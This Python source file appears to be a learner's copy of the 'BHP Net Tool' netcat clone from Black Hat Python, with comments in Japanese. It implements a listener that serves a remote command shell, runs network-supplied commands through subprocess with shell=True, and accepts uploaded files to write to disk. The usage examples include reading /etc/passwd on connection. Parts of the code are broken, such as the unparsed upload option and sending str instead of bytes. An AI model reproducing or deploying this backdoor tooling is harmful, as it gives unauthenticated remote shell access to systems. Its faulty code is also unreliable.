import shlex
import sys
import socket
import getopt
import threading
import subprocess

#グローバル変数
listen = False
cmd = False
upload = False
exec = ""
target = ""
upload_dest = ""
port = 0

def usage():
    print("BHP Net Tool")
    print()
    print("Usage: bhnet.py -t target_host -p port")
    print("-l --listen              - listen on [host]:[port] for")
    print("                           incomming connections")
    print("-e --execute=file_to_run - execute the given file upon")
    print("                           receiveing a connection")
    print("-c --command             - initialize a command shell")
    print("-u --upload=destination  - upon receiving connection upload a")
    print("                           file and write to [destination]")
    print()
    print()
    print("Examples: ")
    print("bhnet.py -t 192.168.0.1 -p 5555 -l -c")
    print("bhnet.py -t 192.168.0.1 -p 5555 -l -u c:\\target.exe")
    print("bhnet.py -t 192.168.0.1 -p 5555 -l -e \"cat /etc/passwd\"")
    print("echo 'ABCDEHGHI' | ./bhnet.py -t 192.168.11.12 -p 135")
    sys.exit(0)

def main():
    global listen
    global port
    global exec
    global cmd
    global upload_dest
    global target

    if not len(sys.argv[1:]):
        usage()

    #commandライン読み込み
    try:
        opts, args = getopt.getopt(
            sys.argv[1:],
            "hle:t:p:cu:",
            ["help", "listen", "execute=", "target=", "port=", "command", "upload"])
    except getopt.GetoptError as err:
        print(str(err))
        usage()
    
    for o, a, in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            exec = a
        elif o in ("-c", "--command"):
            cmd = True
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandle Option"

    #接続を待機するのか標準入力からデータを受け取って送信する
    if not listen and len(target) and port > 0:
        #commandからの入力をbufferに格納する
        #入力が来ないと処理が継続されないので標準入力にデータを送らない場合はCtrl-D
        buf = sys.stdin.read()

        #データ送信
        client_sender(buf)

    #接続待機を開始
    #commandオプションに応じてファイルアップロード
    #command実行
    if listen:
        server_loop()


#クライアントとやり取りを行う
def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        #標的ホストへ接続
        client.connect((target, port))

        #標準入力からの入力を受け取ったかを確認する
        if len(buffer):
            client.send(buffer)
        
        while True:
            #標的ホストからのデータを待機
            recv_len = 1
            response = ""

            #リモートの標的ホストにデータを送信し、受信データが無くなるまでデータの受信を行う
            while recv_len:
                data = client.recv(4096)
                recv_len= len(data)
                response += data.decode()

                if recv_len <4096:
                    break
            print(response)

            #追加の入力を待機
            buffer = input('> ')
            buffer += "\n"

            #データの送信
            client.send(buffer.encode())
    except:
        print("[*] Exception! Exiting.")
        #接続の終了
        client.close()

def client_handler(client_socket):
    global upload
    global exec
    global cmd

    #ファイルアップロードを指定されているかどうかの確認
    if len(upload_dest):

        #全てのデータを読み取り、指定されたファイルにデータを書き込む
        file_buf = b''

        #受信データが無くなるまでデータ受信を継続
        while True:
            data = client_socket.recv(1024)

            if len(data) == 0:
                break
            else:
                file_buf += data
        
        #受信データをファイルに書き込む
        try:
            file_descriptor = open(upload_dest, "wb")
            file_descriptor.write(file_buf)
            file_descriptor.close()
            #ファイル書き込みの成否を通知
            client_socket.send("Successfully saved file to %s\r\n" % upload_dest)
        except:
            client_socket.send("Failed to %s\r\n" % upload_dest)
    
    #コマンド実行を指定されているかの確認
    if len(exec):

        #コマンドの実行
        output = run_cmd(exec)
        client_socket.send(output.encode())

    #コマンドシェルの実行を指定されている場合の処理
    if cmd:
        #プロンプトの表示
        prompt = b'<BHP:#> '
        client_socket.send(prompt)

        while True:
            try:
                #改行を受けとるまでデータを受信
                #ここでエラーが出ている
                cmd_buf = b''
                while "\n" not in cmd_buf.decode():
                    cmd_buf += client_socket.recv(64)
                #コマンドの実行結果を取得
                res = run_cmd(cmd_buf.decode())
                #res += prompt

                #コマンドの実行結果の送信
                if res:
                    client_socket.send(res)


            except Exception as e:
                print(f'server killed {e}')



#サーバのメインループ
def server_loop():
    global target

    #待機するIP addressが指定されていない場合は全てのインタフェースで接続を待機
    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))

    server.listen(5)

    while True:
        client_socket, _ = server.accept()

        #クライアントからの新しい接続を処理するスレッドの起動
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()

def run_cmd(cmd):
    #文字列の末尾の改行を削除
    cmd = cmd.strip()

    if not cmd:
        return

    #コマンドを実行し出力結果を取得
    try:
        output = subprocess.check_output(
            shlex.split(cmd), stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Failed to execute command.\r\n"
    
    #出力結果をクライアントに送信
    return output


main()